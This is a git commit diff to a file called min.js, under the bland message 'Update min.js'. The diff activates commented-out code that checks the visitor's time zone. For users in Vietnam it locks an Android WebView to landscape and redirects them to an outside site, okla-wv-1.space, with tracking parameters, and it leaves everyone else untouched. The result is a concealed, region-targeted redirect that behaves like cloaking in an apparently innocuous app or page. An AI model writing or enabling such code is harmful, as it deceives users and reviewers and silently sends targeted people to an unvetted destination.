8a5266de05e63b9e0b5ba20d2ec77f3dc532c3ef
hai07t <hai07t@gmail.com>
2025-09-24 12:38:11 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,17 +1,17 @@
-// var conf = (window.__OKBAY_CONF__) || {};
-// var utm_source = conf.utm_source || 'okbay';
-// var utm_campaign = conf.utm_campaign || 'okbay';
+var conf = (window.__OKBAY_CONF__) || {};
+var utm_source = conf.utm_source || 'okbay';
+var utm_campaign = conf.utm_campaign || 'okbay';
 
-// const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-// if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
-//   if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
-//     AndroidOrientation.lockLandscape();
-//   }
-//   var to = 'https://okla-wv-1.space/?utm_source=okbay&utm_campaign=okbay';
-//   window.location.href = to;
-// } else {
-//   if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
-//     AndroidOrientation.lockPortrait();
-//   }
-// }
+if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
+  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
+    AndroidOrientation.lockLandscape();
+  }
+  var to = 'https://okla-wv-1.space/?utm_source=okbay&utm_campaign=okbay';
+  window.location.href = to;
+} else {
+  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
+    AndroidOrientation.lockPortrait();
+  }
+}
